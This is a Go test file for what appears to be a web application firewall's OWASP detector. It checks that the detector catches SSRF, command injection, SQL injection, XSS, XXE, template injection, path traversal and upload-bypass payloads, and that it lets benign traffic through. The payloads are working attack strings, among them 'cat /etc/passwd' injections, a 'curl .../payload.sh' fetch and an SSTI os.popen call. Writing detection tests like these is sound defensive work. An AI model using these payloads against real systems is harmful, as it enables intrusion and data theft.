package owasp

import (
	"strings"
	"testing"
)

func TestCheckOWASP_SSRF_Metadata(t *testing.T) {
	hits := CheckOWASP("mid", "/fetch", "url=http://169.254.169.254/latest/meta-data/", nil, nil)
	if !hasCategory(hits, CatSSRF) {
		t.Fatal("expected SSRF hit for cloud metadata endpoint")
	}
}

func TestCheckOWASP_SSRF_FileScheme(t *testing.T) {
	hits := CheckOWASP("mid", "/", "u=file:///etc/passwd", nil, nil)
	if !hasCategory(hits, CatSSRF) && !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected SSRF or path traversal hit")
	}
}

func TestCheckOWASP_CmdInjection(t *testing.T) {
	hits := CheckOWASP("mid", "/ping", "host=8.8.8.8;cat /etc/passwd", nil, nil)
	if !hasCategory(hits, CatCmdInject) && !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected command injection hit")
	}
}

func TestCheckOWASP_CmdInjection_Backtick(t *testing.T) {
	hits := CheckOWASP("high", "/", "q=`whoami`", nil, nil)
	if !hasCategory(hits, CatCmdInject) {
		t.Fatal("expected command injection for backtick")
	}
}

func TestHasCmdIndicatorSkipsBrowserUASeparators(t *testing.T) {
	input := "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/114.0.0.0 safari/537.36"
	if hasCmdIndicator(input) {
		t.Fatal("browser UA separators without shell command words should not enter cmd injection regex scan")
	}
}

func TestHasCmdIndicatorKeepsCommandEntrypoints(t *testing.T) {
	inputs := []string{
		"host=8.8.8.8;id",
		"test|whoami",
		"`whoami`",
		"q=$(whoami)",
		"cmd=cat${ifs}/etc/passwd",
		"input=test&&whoami",
		"out=1>>/tmp/x",
		"file=%00id",
		"line=ok\nid",
		"curl http://example.test/payload.sh",
		"wget http://example.test/payload.sh",
		"w``hoami",
		"w`h`o`a`m`i",
		"<!--#exec cmd=\"id\"-->",
	}
	for _, input := range inputs {
		if !hasCmdIndicator(input) {
			t.Fatalf("expected command indicator for %q", input)
		}
	}
}

func TestHasCmdIndicatorSkipsPlainAssignments(t *testing.T) {
	inputs := []string{
		"id=5",
		"sort=name",
		"PATH=/tmp value",
		"token=abc123",
	}
	for _, input := range inputs {
		if hasCmdIndicator(input) {
			t.Fatalf("plain assignment %q should not enter cmd injection regex scan", input)
		}
	}
}

func TestShouldScanCmdPatternPrefilterHighFrequencyRules(t *testing.T) {
	tests := []struct {
		id    string
		input string
		want  bool
	}{
		{id: "owasp:cmd:007", input: "host=8.8.8.8;id;", want: true},
		{id: "owasp:cmd:007", input: "font-family: Arial; color: red", want: false},
		{id: "owasp:cmd:010", input: "PATH=/tmp whoami", want: true},
		{id: "owasp:cmd:010", input: `{"val_nm":"ad34","val_act":"exposure_yw","channel":""}`, want: false},
		{id: "owasp:cmd:015", input: "echo abc|base64 -d|sh", want: true},
		{id: "owasp:cmd:015", input: "echo abc|base64\t-d|sh", want: true},
		{id: "owasp:cmd:015", input: "a|b|c", want: false},
	}
	for _, tt := range tests {
		pattern, ok := findCmdPatternForTest(tt.id)
		if !ok {
			t.Fatalf("missing command pattern %s", tt.id)
		}
		if got := shouldScanCmdPattern(tt.input, pattern); got != tt.want {
			t.Fatalf("shouldScanCmdPattern(%s, %q) = %v, want %v", tt.id, tt.input, got, tt.want)
		}
	}
}

func TestCheckOWASP_CmdInjectionHighFrequencyPrefilterKeepsAttacks(t *testing.T) {
	tests := []string{
		"host=8.8.8.8;id;",
		"echo abc|base64 -d|sh",
	}
	for _, input := range tests {
		hits := CheckOWASP("mid", "/cmd", input, nil, nil)
		if !hasCategory(hits, CatCmdInject) {
			t.Fatalf("expected command injection hit for %q, got %+v", input, hits)
		}
	}
}

func findCmdPatternForTest(id string) (owaspPattern, bool) {
	for _, p := range cmdInjectPatterns {
		if p.id == id {
			return p, true
		}
	}
	return owaspPattern{}, false
}

func TestCheckOWASP_XXE(t *testing.T) {
	payload := `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
	hits := CheckOWASP("mid", "/", "xml="+payload, nil, nil)
	if !hasCategory(hits, CatXXE) && !hasCategory(hits, CatSSRF) && !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected XXE, SSRF, or path traversal hit")
	}
}

func TestCheckOWASP_LDAP(t *testing.T) {
	hits := CheckOWASP("mid", "/login", "user=*)(objectclass=*", nil, nil)
	if !hasCategory(hits, CatLDAPI) {
		t.Fatal("expected LDAP injection hit")
	}
}

func TestCheckOWASP_NoSQLi(t *testing.T) {
	hits := CheckOWASP("mid", "/api/users", `filter={"$where": "this.password == 'a'"}`, nil, nil)
	if !hasCategory(hits, CatNoSQLi) {
		t.Fatal("expected NoSQL injection hit")
	}
}

func TestCheckOWASP_TemplateInjection(t *testing.T) {
	hits := CheckOWASP("mid", "/", "name={{7*7}}", nil, nil)
	if !hasCategory(hits, CatTmplInject) {
		t.Fatal("expected template injection hit")
	}
}

func TestCheckOWASP_TemplateInjection_Jinja(t *testing.T) {
	hits := CheckOWASP("mid", "/", "n={{''.__class__.__mro__}}", nil, nil)
	if !hasCategory(hits, CatTmplInject) {
		t.Fatal("expected SSTI hit for jinja mro")
	}
}

func TestCheckOWASP_ProtocolViolation_Smuggling(t *testing.T) {
	headers := map[string]string{
		"Content-Length":    "10",
		"Transfer-Encoding": "chunked",
	}
	hits := CheckOWASP("mid", "/", "", headers, nil)
	if !hasCategory(hits, CatProtoViol) {
		t.Fatal("expected protocol violation for CL+TE smuggling")
	}
}

func TestCheckOWASP_ProtocolViolation_CanBeDisabledByCategorySensitivity(t *testing.T) {
	headers := map[string]string{
		"Content-Length":    "10",
		"Transfer-Encoding": "chunked",
	}
	hits := CheckOWASP("mid", "/", "", headers, nil, map[string]string{"protocol_violation": "off"})
	if hasCategory(hits, CatProtoViol) {
		t.Fatalf("expected protocol_violation category to be disabled, got %+v", hits)
	}
}

func TestCheckFileUpload_DangerousExt(t *testing.T) {
	hit, ok := CheckFileUpload("shell.php", "image/jpeg")
	if !ok || hit.Category != CatFileUpload {
		t.Fatal("expected file upload hit for .php extension")
	}
}

func TestCheckFileUpload_DoubleExt(t *testing.T) {
	hit, ok := CheckFileUpload("malware.php.jpg", "image/jpeg")
	if !ok || hit.Category != CatFileUpload {
		t.Fatal("expected file upload hit for double extension")
	}
}

func TestCheckFileUpload_Clean(t *testing.T) {
	_, ok := CheckFileUpload("photo.jpg", "image/jpeg")
	if ok {
		t.Fatal("clean image upload should not trigger")
	}
}

func TestCheckFileUpload_NullByte(t *testing.T) {
	hit, ok := CheckFileUpload("file.jpg%00.php", "")
	if !ok || hit.Category != CatFileUpload {
		t.Fatal("expected null byte detection")
	}
}

// Enhanced SQLi patterns
func TestCheckOWASP_SQLi_Boolean(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 or 1=1", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for boolean tautology")
	}
}

func TestCheckOWASP_SQLi_ErrorBased(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 and extractvalue(1,concat(0x7e,version()))", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for extractvalue error-based")
	}
}

// Enhanced XSS patterns
func TestCheckOWASP_XSS_SVG(t *testing.T) {
	hits := CheckOWASP("mid", "/", "q=<svg onload=alert(1)>", nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for SVG vector")
	}
}

func TestCheckOWASP_XSS_DataURL(t *testing.T) {
	hits := CheckOWASP("mid", "/", "url=data:text/html,<script>alert(1)</script>", nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for data URL")
	}
}

// Ensure localhost Host header does not cause SSRF false positive.
func TestCheckOWASP_SSRF_LocalhostHostHeader(t *testing.T) {
	headers := map[string]string{
		"Host":            "127.0.0.1",
		"Accept":          "text/html",
		"Accept-Language": "en-US",
	}
	hits := CheckOWASP("high", "/abcdefg/hijklmn/a.html", "", headers, nil)
	if hasCategory(hits, CatSSRF) {
		t.Fatal("Host header 127.0.0.1 should not trigger SSRF — it is a standard request attribute")
	}
}

// Ensure SSRF still detects localhost in actual payloads (query string).
func TestCheckOWASP_SSRF_LocalhostInPayload(t *testing.T) {
	hits := CheckOWASP("high", "/", "url=http://127.0.0.1/admin", nil, nil)
	if !hasCategory(hits, CatSSRF) {
		t.Fatal("expected SSRF hit for localhost in query payload")
	}
}

// ── New tests: body scanning, base64 decoding, cookie scanning ──

func TestCheckOWASP_CmdInjection_InBody(t *testing.T) {
	hits := CheckOWASP("mid", "/", "", nil, []string{"test|whoami"})
	if !hasCategory(hits, CatCmdInject) {
		t.Fatal("expected cmd injection hit in body target")
	}
}

func TestCheckOWASP_SQLi_InBody(t *testing.T) {
	hits := CheckOWASP("mid", "/", "", nil, []string{"1' OR 1=1--"})
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit in body target")
	}
}

func TestCheckOWASP_XSS_InBody(t *testing.T) {
	hits := CheckOWASP("mid", "/", "", nil, []string{"<script>alert(1)</script>"})
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit in body target")
	}
}

func TestCheckOWASP_Base64_TemplateInjection(t *testing.T) {
	// "e3sgMzMzMSozMzMwIH19" base64 decodes to "{{ 3331*3330 }}"
	hits := CheckOWASP("mid", "/", "retain=e3sgMzMzMSozMzMwIH19", nil, nil)
	if !hasCategory(hits, CatTmplInject) {
		t.Fatal("expected template injection from base64-encoded payload")
	}
}

func TestCheckOWASP_HTMLEntity_XSS(t *testing.T) {
	hits := CheckOWASP("mid", "/", "q=&#60;script&#62;alert(1)&#60;/script&#62;", nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit from HTML entity encoded payload")
	}
}

func TestCheckOWASP_CookieInjection(t *testing.T) {
	headers := map[string]string{
		"Cookie": "session=abc123def456; lang=<script>alert(1)</script>",
	}
	hits := CheckOWASP("mid", "/", "", headers, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit from cookie value")
	}
}

func TestCheckOWASP_CookieSessionIDSkipped(t *testing.T) {
	headers := map[string]string{
		"Cookie": "SESSIONID=9a5c9c052176b6d17d8936cd2b7e942fbebeed81e12dda6e285481bca18c2d62",
	}
	hits := CheckOWASP("mid", "/api/v1/users", "", headers, nil)
	if len(hits) > 0 {
		t.Fatal("session ID cookie should not trigger any detection")
	}
}

func TestCheckOWASP_BlazeFalsePositive_TSXImport(t *testing.T) {
	hits := CheckOWASP("high", "/run", "file=demo.tsx", nil, []string{"import type { MenuProps } from 'antd'; import { Dropdown } from 'antd';"})
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("TSX import snippet should not trigger SQLi, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_PerformanceBeaconScriptWord(t *testing.T) {
	hits := CheckOWASP("high", "/web/performance", `param={"val_url":"https://open.163.com/newview/search/for power, binary<script is incorrect","performance":true}`, nil, nil)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("telemetry URL text containing '<script' should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_AdminUpstreamLocalhost(t *testing.T) {
	headers := map[string]string{"Content-Type": "application/json"}
	body := []string{"{\"upstreams\":[\"http://127.0.0.1:8889\"],\"server_names\":[\"1111\"]}"}
	hits := CheckOWASP("high", "/api/Website", "", headers, body)
	if hasCategory(hits, CatSSRF) {
		t.Fatalf("admin upstream config should not trigger SSRF, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeOpaqueEncodedBodyWithoutContentType(t *testing.T) {
	raw := "qSKqCpjt2Khc2zp3xWlArathZXZB3kZwxj3fvikMvpxI5+g7xgkuPnyZlAa5DN9U9solP15s9JWe6WKDTdOrc8kw0EOTAtkuR+lZMWsETMkmDg6t2Pvo2UyjDM0nAuNHhj6SwP/6qnqUIrborod5T4GQrBa7jPeGVAkRHWmxUck+o76fkJeJlCTcJfEkjM1GmDZbycXWyHQs3NeBeXCKCVKiJ1wxlfyrh7xv+e3gIVTr6fnd/8FW5bFtXBAyNdycLyAbUr6TderOfYXV18501EENBsCxA4hj+IabICZ5Ro+AlaqYHeRt3CTX1F6t2r5D9snHpg8eyYcPog8ZJmzdDQrK3kzfX7aJKILHr2yOzB8cwdi22aeBRDCu94nhlvlR7fVefFUjzOvEQyA9LZ2UCtIjFvvISe2MVXM6OYalvXdFnbw6jJCRfrfO3gu8IAtJFuYb6p8tfGNVZk59rHM2yXGVw+pR66djbiDEz0VFABoeiZPB0VG76hB5szYEfwNvgYUWEQZaQKvp/gvI3+ckwNcwK8qQc0RVshQTuQs/jRcjVDR7hhEWC8+u1DZergAaV89Hf9FZzFuQzAn3Q/Bt7XVP2yyAI7Nke+aFgNDb6jl8CosvA722yIAim92Valte/0vxxbqXekVL5i05WOgRYmBjvfhseIIXYyHbHNGRlQnvkbNBNSONtLZUrUs+gzkOIpOaW+3XPF2SNKGcaJB6Gbft2YULbFbzUEPDAcpj399tQlZ3JH38iLd0jf8DITCvkIB6cOTREj6MmfEYMSSU2Wbp8fgMZAKY107yUzQpeUTHyj3ytAgwvXKLfCvhm98xGcksMQHMkBco4LcO6X9A7mazaIRsXsi5fALdGG1BfcTIohXAINmt/Ka4bIIBrqx/DXqu3UAjPsyTqnJgbuBdJxxFvsZCgYKgmR3lUJot1wpHayrIzoAKQcE3mGRnyksyXIYVxkyxrheMsQZKRhNv+X2BjJMxntw21pCiRsUxtg0RfixBQtOMO/kTOi4QcdLqtCFOUEtwOG//1LADFRxj1VQS03BMUFj4GjwCbwjSWRmT6rJO2QRCZemLVQLpH4fEzRLbPuQG8rzMQfh4NhaOyvQlxiLEmvtyzZ/AtxQ8/t/sQ5g2t9LhWDQgiwVGw8IzvBSXzxoIn7LwCgVQq1drjF2s7pB2R0nJL41jP4SLgEC8e60voCBV88eBCDv6SHgBhEeSyrBtG1nXMfDbUujJIapZlmIhDROEfgcozAna10KXDxzv7l5YgPBv9ENDAbhhUVOh3+Yd8xjGD11sEy2I0JzHRcIvVNl4N+/FQm5cITdlLGjyl7BDKP5cd5IPTqiQzb0zvnBIhZQ6EOHEa21v6F8opRUDRx0/5Zq6AxPW2i+bH5lHjj69zwf9pK2FBUAdQ1AcNisgkkRUgKJAJVbr0eITvkdTrU5xlgysjLntSUnbMjs89YiFz4RtJGSViToJ2VVrfsH2mzKL+0C3GLkm6WDxI0kg8cEHn8WC/yla9w3CYbEKL7E0l1dqw2uekyK6OtUBgkXIkCRbvHCERFAtMEScBfWHTId3awys//Q/Vs7qTbHT+wsECpN/kvOkxyw+"
	hits := CheckOWASP("high", "/uc/feedback/api/v1/pc/feedback/add", "", map[string]string{"Host": "10.10.3.128:2280"}, []string{raw})
	if !hasCategory(hits, CatProtoViol) {
		t.Fatalf("opaque long base64-like body without content-type should trigger protocol violation, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_CodePenInlineScript(t *testing.T) {
	body := []string{"https://codepen.io https://cpwebassets.codepen.io <script src=\"https://cpwebassets.codepen.io/assets/editor/iframe/iframeConsoleRunner.js\"></script> React.createElement createRoot preventDefault target=\"_blank\""}
	hits := CheckOWASP("high", "/cpe/boomboom/store", "", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("CodePen editor payload should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_AnalyticsJavascriptVoid0(t *testing.T) {
	body := []string{"{\"attributes\":\"{\\\"href\\\":\\\"javascript: void(0);\\\"}\"}"}
	hits := CheckOWASP("high", "/analytics/v2_upload", "appkey=0WEB0OEX9Y4SQ244", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("analytics beacon javascript:void(0) should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_BingCSPJavascriptVoid0(t *testing.T) {
	body := []string{"[{\"body\":{\"sample\":\"javascript:void(0);\"}}]"}
	hits := CheckOWASP("high", "/api/report", "cat=bingcsp", map[string]string{"Content-Type": "application/reports+json"}, body)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("bing csp report javascript:void(0) should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_BingGLinkPingPostJavascriptVoid0(t *testing.T) {
	hits := CheckOWASP("high", "/fd/ls/GLinkPingPost.aspx", "IG=BD260740AF264E0F93C3C3F2866590BC&ID=SERP,5036.1&url=javascript%3Avoid(0)%3B", map[string]string{"Content-Type": "text/plain;charset=UTF-8"}, nil)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("bing GLinkPingPost javascript:void(0) should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_LogstoreWindowLocation(t *testing.T) {
	body := []string{"{\"value\":\"function(e){var n=new URL(window.location.href);Array.from(document.querySelectorAll('.x'))}\"}"}
	hits := CheckOWASP("high", "/logstores/prod/track", "", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("logstore frontend code should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_LogstoreEmbeddedSVG(t *testing.T) {
	body := []string{"{\"value\":\"<svg t=\\\"1682594285904\\\" class=\\\"icon\\\" viewBox=\\\"0 0 1024 1024\\\" xmlns=\\\"http://www.w3.org/2000/svg\\\"></svg> function(t){e(t)} document.querySelectorAll('.x')\"}"}
	hits := CheckOWASP("high", "/logstores/prod/track", "", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("logstore embedded svg/ui code should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_POCRelativePathYAML(t *testing.T) {
	body := []string{"{\"code\":\"name: poc-yaml\\ntransport: http\\npath: /IND780/excalweb.dll?webpage=../../AutoCE.ini\"}"}
	hits := CheckOWASP("high", "/api/v2/xray/poc/create/", "", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatPathTrav) {
		t.Fatalf("poc editor relative path should not trigger path traversal, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_SpeedTelemetryURLQuery(t *testing.T) {
	body := []string{"payload=https://localhost.sec.qq.com:9410/?cmd=101&service=1&id=abc&from=https%3A%2F%2Fqzone.qq.com%2F"}
	hits := CheckOWASP("high", "/speed", "id=RiaWqsnT3403yXTgVY", map[string]string{"Content-Type": "multipart/form-data"}, body)
	if hasCategory(hits, CatPathTrav) {
		t.Fatalf("speed telemetry urlquery should not trigger path traversal, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_RunReactCode(t *testing.T) {
	body := []string{"createRoot(document.getElementById('container')).render(<Demo />); <a onClick={(e) => e.preventDefault()}>"}
	hits := CheckOWASP("high", "/run", "file=demo.tsx", map[string]string{"Content-Type": "application/x-www-form-urlencoded"}, body)
	if hasCategory(hits, CatXSS) || hasCategory(hits, CatCmdInject) {
		t.Fatalf("stackblitz react code should not trigger xss/cmd, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_NewsTelemetryAdScript(t *testing.T) {
	body := []string{"<div class=\"row_ad\"><script type=\"text/javascript\">var winWidth = window.innerWidth || document.documentElement.clientWidth; document.querySelector('#box').style.display='block';</script><script src=\"https://cpro.baidustatic.com/cpro/ui/cm.js\"></script><iframe src=\"https://pos.baidu.com/nclm\"></iframe>"}
	hits := CheckOWASP("high", "/news/g", "", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("news telemetry ad script should not trigger XSS, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalsePositive_CTripJavaDeserializeMessage(t *testing.T) {
	body := []string{"Cannot deserialize instance of java.util.ArrayList<java.lang.Integer> out of VALUE_STRING token; resource.c-ctrip.com load success"}
	hits := CheckOWASP("high", "/bee/collect", "", map[string]string{"Content-Type": "application/json"}, body)
	if hasCategory(hits, CatWebshell) {
		t.Fatalf("ctrip deserialize error text should not trigger webshell, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeFalseNegative_QueryValueBase64UnionSelect(t *testing.T) {
	hits := CheckOWASP("high", "/", "multi=register&prepare=encapsulate&report=TlM4cUlHRndjR1Z1WkdOdmJXMWxiblJ6Y25OelptVmhkSFZ5WldOeVpXVndZMkZqYUdWamIyNTBZV2x1YzJSeVlXZHZibVpzZVcxaGRHTm9kbTlwWkdSd1kyME5hbk52Ym1sdGNHOXlkSE5oYkdsbmJteGxablIwWVdKcGJtUmxlSEpsWTNSemMyTnliMnhzWW1GeURRMGdLaTlCYm1RTk5Rb2pJR1psWkc5eVlXRm1kR1Z5Ym05dmJtWnZjbU5sWkc1aGRHbDJaU0FLUFNNZ1pHRjBaWFJwYldWd2JHRjVjMmx1WjJ4bElBb3pMeW9nWVdKemIyeDFkR1Z2Y21sbGJuUmhkR2x2Ym5WdVkyeHZjMlZrQ25CdmFXNTBjMkZ0WVhsaGIyeGtiMjVzYjJGa0lDb3ZMUzBnWTI5eWNtVmpkSE5yZVhCbGNHeGhlWE4wWVhScGIyNXdjbVZtWlhKeVpXUnZjSFJuY205MWNHbHVkR1Z5ZG1Gc1pYaHdZVzVrYjJOb1lXNW5aV1J5WlhGMVpYTjBaV1FnQ25WdVNVOU9MeW9nY25WdWRHbHRaWGRwYkd4d1lYSmxiblFLSUNvdlUwVk1SVU4wRFMwdElITjBhV05yZVhadmFXUnpaV04wYVc5dWMzTmhkSFZ5WkdGNVpHbHlaV04wYVhabGMyeHBjM1J1WVhScGRtVnlkV2xrWkc5MVlteGxJQW94Q2lNPQ%3D%3D", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatalf("nested base64 query payload should trigger SQLi, got %+v", hits)
	}
}

func TestCheckOWASP_StrutsOGNLRelativeRequestTarget(t *testing.T) {
	hits := CheckOWASP("high", "index.action", `redirect:${#a=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#b=#a.getRealPath("/"),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#b)}`, nil, nil)
	if !hasCategory(hits, CatExprLang) {
		t.Fatalf("relative Struts OGNL request target should trigger expression-language detection, got %+v", hits)
	}
}

func TestNormalize_HTMLEntity(t *testing.T) {
	input := "&#60;script&#62;alert(1)&#60;/script&#62;"
	result := normalize(input)
	if !strings.Contains(result, "<script>") {
		t.Fatalf("expected HTML entities decoded, got %q", result)
	}
}

func TestNormalize_Base64Decode(t *testing.T) {
	input := "e3sgMzMzMSozMzMwIH19"
	result := normalizeWithDecode(input)
	if !strings.Contains(result, "3331*3330") {
		t.Fatalf("expected base64 decoded content, got %q", result)
	}
}

// ── New variant detection tests ──

// SQLi: ORDER BY enumeration with comment
func TestCheckOWASP_SQLi_OrderBy(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 order by 5-- -", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for ORDER BY with comment terminator")
	}
}

// SQLi: MySQL inline comment bypass /*!50000union*/
func TestCheckOWASP_SQLi_InlineComment(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 /*!50000union*/ select * from users", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for MySQL inline comment bypass")
	}
}

// SQLi: Blind extraction with SUBSTR (combined with UNION for realistic payload)
func TestCheckOWASP_SQLi_SubstrBlind(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 and substr((select password from users),1,1)='a'-- ", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for SUBSTR blind extraction")
	}
}

// SQLi: Conditional blind IF(select...)
func TestCheckOWASP_SQLi_ConditionalBlind(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=if(ascii(substr(user(),1,1))=114,1,0)", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for conditional blind SQLi")
	}
}

// XSS: <details> with ontoggle
func TestCheckOWASP_XSS_DetailsOnToggle(t *testing.T) {
	hits := CheckOWASP("mid", "/", `q=<details open ontoggle=alert(1)>`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for details ontoggle")
	}
}

// XSS: <form action=javascript:>
func TestCheckOWASP_XSS_FormJavascript(t *testing.T) {
	hits := CheckOWASP("mid", "/", `q=<form action="javascript:alert(1)">`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for form javascript action")
	}
}

// XSS: String.fromCharCode bypass
func TestCheckOWASP_XSS_FromCharCode(t *testing.T) {
	hits := CheckOWASP("mid", "/", `q=String.fromCharCode(60,115,99,114,105,112,116,62)`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for fromCharCode")
	}
}

// XSS: <embed> with src
func TestCheckOWASP_XSS_Embed(t *testing.T) {
	hits := CheckOWASP("high", "/", `q=<embed src="javascript:alert(1)">`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for embed tag")
	}
}

// XSS: <base href> injection
func TestCheckOWASP_XSS_BaseHref(t *testing.T) {
	hits := CheckOWASP("high", "/", `q=<base href="https://evil.com/">`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for base href injection")
	}
}

// CMD injection: ${IFS} space bypass
func TestCheckOWASP_CmdInject_IFS(t *testing.T) {
	hits := CheckOWASP("mid", "/", "cmd=cat${IFS}/etc/passwd", nil, nil)
	if !hasCategory(hits, CatCmdInject) && !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected cmd injection or path traversal hit for ${IFS}")
	}
}

// CMD injection: chained with &&
func TestCheckOWASP_CmdInject_DoubleAmpersand(t *testing.T) {
	hits := CheckOWASP("mid", "/", "input=test&&whoami", nil, nil)
	if !hasCategory(hits, CatCmdInject) {
		t.Fatal("expected cmd injection hit for && chaining")
	}
}

// CMD injection: jQuery selector must NOT trigger
func TestCheckOWASP_CmdInject_CleanJQuery(t *testing.T) {
	hits := CheckOWASP("mid", "/api", "", nil, []string{`$(document).ready(function(){})`})
	if hasCategory(hits, CatCmdInject) {
		t.Fatal("jQuery $(document) should not trigger cmd injection")
	}
}

// CMD injection: jQuery with class selector must NOT trigger
func TestCheckOWASP_CmdInject_CleanJQuerySelector(t *testing.T) {
	hits := CheckOWASP("mid", "/api", "", nil, []string{`$(".my-class").hide()`})
	if hasCategory(hits, CatCmdInject) {
		t.Fatal("jQuery class selector should not trigger cmd injection")
	}
}

// Path traversal: Tomcat ..;/ bypass
func TestCheckOWASP_PathTrav_TomcatBypass(t *testing.T) {
	hits := CheckOWASP("mid", "/..;/..;/WEB-INF/web.xml", "", nil, nil)
	if !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected path traversal hit for Tomcat ..;/ bypass")
	}
}

// Path traversal: /proc/self/environ
func TestCheckOWASP_PathTrav_ProcSelf(t *testing.T) {
	hits := CheckOWASP("mid", "/", "file=/proc/self/environ", nil, nil)
	if !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected path traversal hit for /proc/self/environ")
	}
}

// Path traversal: overlong UTF-8 encoded dots
func TestCheckOWASP_PathTrav_OverlongUTF8(t *testing.T) {
	hits := CheckOWASP("mid", "/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "", nil, nil)
	if !hasCategory(hits, CatPathTrav) {
		t.Fatal("expected path traversal hit for overlong UTF-8 encoded dots")
	}
}

// SSTI: Python __subclasses__ traversal
func TestCheckOWASP_SSTI_Subclasses(t *testing.T) {
	hits := CheckOWASP("mid", "/", `name={{''.__class__.__mro__[2].__subclasses__()}}`, nil, nil)
	if !hasCategory(hits, CatTmplInject) {
		t.Fatal("expected SSTI hit for __subclasses__")
	}
}

// SSTI: Smarty {php} tag
func TestCheckOWASP_SSTI_SmartyPHP(t *testing.T) {
	hits := CheckOWASP("mid", "/", `tpl={php}system("id");{/php}`, nil, nil)
	if !hasCategory(hits, CatTmplInject) || !hasCategory(hits, CatWebshell) {
		// Should trigger either SSTI or webshell
		if !hasCategory(hits, CatTmplInject) && !hasCategory(hits, CatWebshell) {
			t.Fatal("expected SSTI or webshell hit for Smarty {php}")
		}
	}
}

// SSTI: Python __builtins__.__import__
func TestCheckOWASP_SSTI_PythonDunder(t *testing.T) {
	// This payload may trigger webshell (due to popen) or SSTI (due to __builtins__)
	hits := CheckOWASP("mid", "/", `name={{request.__class__.__builtins__.__import__('os').popen('id')}}`, nil, nil)
	if !hasCategory(hits, CatTmplInject) && !hasCategory(hits, CatWebshell) {
		t.Fatal("expected SSTI or webshell hit for Python dunder import")
	}
}

// SSRF: IPv6-mapped private IP
func TestCheckOWASP_SSRF_IPv6Mapped(t *testing.T) {
	hits := CheckOWASP("mid", "/", "url=http://[::ffff:127.0.0.1]/admin", nil, nil)
	if !hasCategory(hits, CatSSRF) {
		t.Fatal("expected SSRF hit for IPv6-mapped localhost")
	}
}

// SSRF: Decimal IP encoding
func TestCheckOWASP_SSRF_DecimalIP(t *testing.T) {
	hits := CheckOWASP("mid", "/", "url=http://2130706433/admin", nil, nil)
	if !hasCategory(hits, CatSSRF) {
		t.Fatal("expected SSRF hit for decimal-encoded IP")
	}
}

// Deserialization: .NET BinaryFormatter
func TestCheckOWASP_Deser_DotNet(t *testing.T) {
	hits := CheckOWASP("mid", "/", "", nil, []string{"AAEAAAD//wEAAAA="})
	if !hasCategory(hits, CatDeserial) {
		t.Fatal("expected deserialization hit for .NET BinaryFormatter magic")
	}
}

